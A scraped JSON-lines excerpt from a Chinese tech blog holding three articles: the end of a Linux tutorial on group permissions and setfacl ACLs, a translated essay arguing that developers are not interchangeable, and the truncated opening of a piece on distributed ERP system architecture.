class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo chown -R :editors /EDITORS\r\nsudo chmod -R g+w /EDITORS\r\nsudo chmod -R o-x /EDITORS\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b642385033338-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b642385033338-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b642385033338-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b642385033338-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b642385033338-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chown</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">editors</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">EDITORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b642385033338-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">EDITORS</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1f7b642385033338-3\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">EDITORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b642385033338-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>此时 editors 用户组的所有成员都可以访问和修改其中的文件。除此之外其他用户（除了 root 之外）无法访问 <code>/EDITORS</code> 中的任何文件。</p>\n<p>使用这个方法的问题在于，你一次只能操作一个组和一个目录而已。这时候访问控制表（ACL）就可以派得上用场了。</p>\n<h3 id=\"toc_4\">使用访问控制表（ACL）</h3>\n<p>现在，让我们把这个问题变得棘手一点。假设你有一个目录 <code>/DATA</code> 并且你想给 readers 用户组的成员读取权限，并同时给 editors 用户组的成员读和写的权限。为此，你必须要用到 <code>setfacl</code> 命令。<code>setfacl</code> 命令可以为文件或文件夹设置一个访问控制表（ACL）。</p>\n<p>这个命令的结构如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b645703462900\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsetfacl OPTION X:NAME:Y /DIRECTORY\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b645703462900-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b645703462900-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b645703462900-1\"><span class=\"crayon-e\">setfacl </span><span class=\"crayon-i\">OPTION</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">NAME</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">Y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">DIRECTORY</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b645703462900-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>其中 OPTION 是可选选项，X 可以是 <code>u</code>（用户）或者是 <code>g</code> （用户组），NAME 是用户或者用户组的名字，/DIRECTORY 是要用到的目录。我们将使用 <code>-m</code> 选项进行修改。因此，我们给 readers 用户组添加读取权限的命令是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b649376268318\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo setfacl -m g:readers:rx -R /DATA\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b649376268318-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b649376268318-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b649376268318-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">setfacl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">readers</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">rx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">DATA</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b649376268318-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在 readers 用户组里面的每一个用户都可以读取 <code>/DATA</code> 目录里的文件了，但是他们不能修改里面的内容。</p>\n<p>为了给 editors 用户组里面的用户读写权限，我们执行了以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1f7b64c857258897\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo setfacl -m g:editors:rwx -R /DATA \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1f7b64c857258897-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1f7b64c857258897-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1f7b64c857258897-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">setfacl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">editors</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">rwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">DATA</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1f7b64c857258897-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>上述命令将赋予 editors 用户组中的任何成员读取权限，同时保留 readers 用户组的只读权限。</p>\n<h3 id=\"toc_5\">更多的权限控制</h3>\n<p>使用访问控制表（ACL），你可以实现你所需的权限控制。你可以添加用户到用户组，并且灵活地控制这些用户组对每个目录的权限以达到你的需求。如果想了解上述工具的更多信息，可以执行下列的命令：</p>\n<ul>\n<li><code>man usradd</code></li>\n<li><code>man addgroup</code></li>\n<li><code>man usermod</code></li>\n<li><code>man sefacl</code></li>\n<li><code>man chown</code></li>\n<li><code>man chmod</code></li>\n</ul>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113200votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/6085acc0af4696f5d49164561c6bc4f9b590fc26.jpg"}
{"url_object_id": "f2c65dccf718330f513e67e843e7c14f", "title": "他们是优秀的前端，所以这些后端工作也交给他们…", "url": "http://blog.jobbole.com/113210/", "create_date": "2017/12/07", "front_img_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fkm7cqqsr0j20m40er0tm.jpg"], "praise_nums": 3, "comment_nums": 11, "favor_nums": 4, "tags": "职场,程序员", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/the-myth-of-the-interchangeable-developer-38d41aff563e\">Scott Shipp</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p class=\"graf graf--p graf-after--h3\">我多次听经理或招聘人员说，优秀工程师是可以与其他优秀工程师交换的。他们可能会说，“首席工程师为这个项目选择了 F# 语言，如果外面没有太多的 F# 开发者，那么有几年经验的优秀开发者应该也还不错。”</p>\n<p id=\"9c5c\" class=\"graf graf--p graf-after--figure\">我还听说过一些这样的言论，“我知道他们是前端人员，但我们现在需要他们做些后端工作。因为他们本身很优秀，所以这没什么大不了的。”</p>\n<p class=\"graf graf--p graf-after--p\">如果你相信这些蠢话，那我都可以把布鲁克林大桥卖给你了。我还创立了下一个独角兽公司，业务就是把冰卖给爱斯基摩人！我敢肯定，公司很快会有 10 亿美元的估值！机会难得，快来投资吧~</p>\n<p class=\"graf graf--p graf-after--p\"><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fkm7cqqsr0j20m40er0tm.jpg\" width=\"690\" height=\"460\"></p>\n<p class=\"graf graf--p graf-after--p\">好吧，不开玩笑了，说实在的，“优秀的”软件工程师可以交换，这样的想法并不靠谱。我有时会对软件工作感到疑惑，是不是我在简历上写，“我保持良好的记录，不断在新技术上开拓驰骋”，然后我就能去任何想去的公司了？</p>\n<p class=\"graf graf--p graf-after--p\">我不敢相信今天要坐下来和你解释这一点，但是，现在让我们从语言差异开始说起。实际上，我已经将多种语言的代码投入生产，从 Scala 到 C#，从 Java 到 JavaScript。即使我能在几周内学会任何类 C 语言的的语法，（给别人可能需要更多时间，）我仍然清楚地知道，我不会用一种新的语言去开发一个生产代码库。</p>\n<p class=\"graf graf--p graf-after--p\">那么行业或商业背景呢？我已经涉猎在很多领域，包括健康卫生、电子商务、教育和电信。我是否应该认为我有资格在社交媒体工作哪？那么制造业、航空航天、数字加密货币（Cryptocurrency）哪？我的领域究竟能拓展到哪一块？在我被要求从 Web 过渡到移动、桌面或物联网时，也发生了同样的情况。</p>\n<p class=\"graf graf--p graf-after--p\">现在，让我给你讲个小故事。去年，在做后端 Java web 服务工程师的全职工作时，我还参与了另一个团队的工作，他们要在 Ionic Framework 中做一个移动应用程序，并使用 Angular、TypeScript 和一些定制库打组合拳。直到长达八个月的项目临近结束时，我才得以“适应”这种融合了 Ionic/Angular/TypeScript 的工作方式。实际上，“适应”这个词可能有点夸大其词。但仍然困扰我的是，我要在控制器中公开字段，因为需要在视图中显示它们，或者常量应该与其他变量一样命名。</p>\n<p class=\"graf graf--p graf-after--p\">顺便一说，如果你想在 JavaScript 中使用静态类型（static typing），你很快就会发现，这条路走不通。必须准备好“任何”类型！不过，我喜欢使用的 RxJs 订阅。</p>\n<p class=\"graf graf--p graf-after--p\">在项目结束后，我愉快地撤了。我现在再也不会自称为 TypeScript 或移动开发者了。这不是要在口头上表达优越性，而是一个简单的经验问题：八个月的时间不足以证明我在此方面的资质。我敢打赌，任何全职编程的人都会同意我的看法。</p>\n<p class=\"graf graf--p graf-after--p\">一个花了几年时间研究某种语言的开发者，将能够毫不费力地用它思考。她会在脑海中随时准备好所有需要的资源来完成任务，然后继续投入下一个任务。她了解语言环境，可以轻松地将标准库和第三方库结合成一个具有内聚性的新功能，就像一把钥匙对应一把锁一样，以此来轻松地解决问题。然而，当她不知道什么是可用的时候，她会重新造轮子，或者更糟的情况是，她会完全不知所措。</p>\n<p class=\"graf graf--p graf-after--p\">每一种语言都有着其独特的习惯用语、构建和依赖管理工具、框架、库、在线社区、IDE 等一系列东西，这些东西在日常实践中，对开发者生产力的影响比我们想象的要大得多。</p>\n<p class=\"graf graf--p graf-after--p\">但是，所有的语言都一样吗？我是说，C# 和 C++ 的开发者，到底有什么区别？“只是 # 和 ++ 的区别，哈哈，没什么大不了的！”快，把说这话的人扔去喂狮子！</p>\n<p class=\"graf graf--p graf-after--p\">我不是说任何人都不应该更换自己的语言、行业或设备。我只是说，程序员是不一样的。一个以 F# 为主要语言编写应用程序的软件团队，不会从我的 Java 经验中获益，尽管我也花了大量时间写 Scala。我只是说，我们不能找到那些“优秀的开发者”，然后出于奇思妙想，随机地把他们拖到不同的团队，并期望他们能够发挥出应有的效果。我是说，不要把所有“优秀的”开发者当作是可以交换的。</p>\n<p>可交换开发者的神话是不现实的。人与人之间的不同无法消除，并愿每个人都能找到最适合自己的那个角色！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113210\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113210votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113210\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 11 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/675acba0c3fe762a3da3697c582bdec7fa10530b.jpg"}
{"url_object_id": "fa24eafc29a7a991a5f4b675e3fe9aab", "title": "分布式、服务化的 ERP 系统架构设计", "url": "http://blog.jobbole.com/113174/", "create_date": "2017/12/07", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/architecture.jpg"], "praise_nums": 1, "comment_nums": 3, "favor_nums": 4, "tags": "IT技术,分布式,架构", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/liuche/p/7955462.html\">刘彻</a>   </div><p><strong>ERP</strong><strong>之痛</strong></p>\n<p>曾几何时，我混迹于电商、珠宝行业4年多，为这两个行业开发过两套大型业务系统（ERP）。作为一个ERP系统，系统主要功能模块无非是订单管理、商品管理、生产采购、仓库管理、物流管理、财务管理等等。作为一个管理系统，大家的一般开发习惯就是使用.Net或Java技术，建立一个单块（单进程）架构的应用，只有一个SQLServer或MySql数据库。然后在项目文件中分一下各个模块，三层结构方式组织代码编写开发。最后测试，交付上线。</p>\n<p>起初，因为数据量不大，系统性能还不错，各种列表查询，报表查询，Excel数据导出功能等用的都很流畅。但是随着公司业务发展，订单量日积月累，后期各种业务部门的报表查询、数据导出需求不断增多，我们渐渐就感觉系统运行越来越慢。于是我们可能最先想到的解决方案就是，优化系统瓶颈数据库这个大头。我们可能的一种尝试就是将数据库单独放置到一个服务器，实现数据库和应用程序分离，或者是建立各种数据库表索引，优化程序代码等方法。经过这样一番研究优化，系统某些功能可能性能的确大大提高，但是我们还是发现某些功能列表的数据查询导出依然很慢，或者随着数据量继续积累，原来较快的列表导出功能，也愈来愈变得缓慢了。我们用尽各种办法，最后也达不到理想的系统性能速度。</p>\n<p>为了提高系统性能，我们也许会主动学习一些互联网公司的技术经验，什么高并发、高性能、大数据、读写分离等方案，发现自己根本无从下手。我们会觉得因为系统业务特点不一样。ERP系统并发量不高，主要是业务复杂，各种业务耦合度远高于那些互联网应用，不好做拆分，数据查询逻辑要远比互联网系统复杂，一个列表页查询出来的数据，往往需要关联4、5张表才能得到结果。有些报表类的甚至更多。加上各种业务操作事务性、数据一致性要求很高，很多时候导致我们措不及手，无法进一步优化系统。</p>\n<p>曾几何时，我也被这样或那样的理由所挫败，认为ERP系统非常特殊，无药可救，可是后来。。。</p>\n<p>我现在已经不这么认为了，似乎有了新的解决方案O(∩_∩)O哈哈~</p>\n<p><strong>曙光乍现</strong></p>\n<p>在叙述具体方案前，先说下自己的想法。我首先觉得我们做ERP系统前，就得有当今互联网思维。我们不要再去做一个大一统的系统了。我们要分拆一个大系统，做成一个个小系统。然后通过系统接口让这些小系统相互通信。这样来组成一个大系统，具体来说就是“分布式”、“服务化”的互联网思维。让系统在架构设计上就是一个先天支持高度可扩展的系统。</p>\n<p>怎么做呢？具体来说就是要将订单管理、商品管理、生产采购、仓库管理、物流管理、财务管理拆分成一个个子系统。这些子系统可以单独设计开发，对外暴露出各种其他子系统需求的数据接口即可。每个子系统都有单独的数据库。甚至这些子系统可以交由不同的团队去开发和维护，使用不同的技术体系，使用不同的数据库。而不是再像以前那样，都集成在同一个大而全的系统中，一个大而全的数据库。</p>\n<p>对于新架构的系统他有什么优点呢？</p>\n<p>首先，也是最重要的就是解决系统的性能问题。以往数据库实例只有一个，没法扩展出多个实例，以便在性能受限的情况下依靠增加数据库实例来达到负载均衡。也许有人会说可以使用读写分离方案，但是因为ERP系统的特点，这个方案很多时候不现实。比如说操作库存的时候，你不能从读库里读库存，然后在写库里写入库存。因为主从复制会有时效性，写入的库存并不能马上写入从库。这样的场景在ERP中也有多处。何况写库不能扩展，只能有一个。而新设计方案是写库是分离的，每个子系统有自己的数据库。</p>\n<p>其次，就是更新非常方便，各个子系统以后台微服务的方式存在。前台一个单独的web项目，这个web项目调用后台这些子系统的服务接口。这样的设计，在某个业务子系统需要更新的时候，可以单独更新。不用像以前那种单进程架构时，一个小更新需要整个系统重启，导致用户会话也丢失，用户需要新登录。而现在的这种设计就不会有这个问题。</p>\n<p><strong>系统整体设计</strong></p>\n<p>系统物理部署视图</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/92662fec4eb3e86e81fbd23e062cef51.png\" alt=\"\" width=\"659\" height=\"534\"></p>\n<p><strong>详细设计</strong></p>\n<p><strong>   